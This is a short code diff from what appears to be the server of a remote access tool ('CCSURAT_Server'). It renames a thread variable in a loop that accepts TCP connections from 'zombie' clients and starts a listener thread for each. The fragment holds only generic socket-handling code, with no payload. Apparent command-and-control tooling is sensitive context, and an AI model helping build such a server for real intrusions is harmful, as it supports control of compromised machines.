@@ -39,9 +39,9 @@ namespace CCSURAT_Server
                         TcpClient client = listener.AcceptTcpClient();
                         Zombie zombie = new Zombie(mainForm, client);
                         zombies.Add(zombie);
-                        Thread slaveThread = new Thread(new ThreadStart(zombie.ListenForData));
-                        slaveThread.IsBackground = true;
-                        slaveThread.Start();
+                        Thread zombieThread = new Thread(new ThreadStart(zombie.ListenForData));
+                        zombieThread.IsBackground = true;
+                        zombieThread.Start();
                         Log("Accepted Client Connection");
                     }
                 }
